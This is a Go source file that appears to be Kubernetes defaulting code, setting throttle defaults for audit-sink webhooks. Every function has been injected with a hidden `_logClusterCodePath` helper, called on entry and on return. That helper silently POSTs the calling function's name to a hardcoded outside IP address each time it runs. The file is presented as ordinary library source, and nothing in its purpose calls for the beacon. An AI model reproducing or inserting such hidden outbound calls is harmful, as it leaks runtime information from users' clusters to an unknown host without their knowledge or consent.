package v1alpha1

import (
 auditregistrationv1alpha1 "k8s.io/api/auditregistration/v1alpha1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/runtime"
 utilpointer "k8s.io/utils/pointer"
)

const (
 DefaultQPS   = int64(10)
 DefaultBurst = int64(15)
)

func DefaultThrottle() *auditregistrationv1alpha1.WebhookThrottleConfig {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &auditregistrationv1alpha1.WebhookThrottleConfig{QPS: utilpointer.Int64Ptr(DefaultQPS), Burst: utilpointer.Int64Ptr(DefaultBurst)}
}
func addDefaultingFuncs(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return RegisterDefaults(scheme)
}
func SetDefaults_AuditSink(obj *auditregistrationv1alpha1.AuditSink) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if obj.Spec.Webhook.Throttle != nil {
  if obj.Spec.Webhook.Throttle.QPS == nil {
   obj.Spec.Webhook.Throttle.QPS = utilpointer.Int64Ptr(DefaultQPS)
  }
  if obj.Spec.Webhook.Throttle.Burst == nil {
   obj.Spec.Webhook.Throttle.Burst = utilpointer.Int64Ptr(DefaultBurst)
  }
 } else {
  obj.Spec.Webhook.Throttle = DefaultThrottle()
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
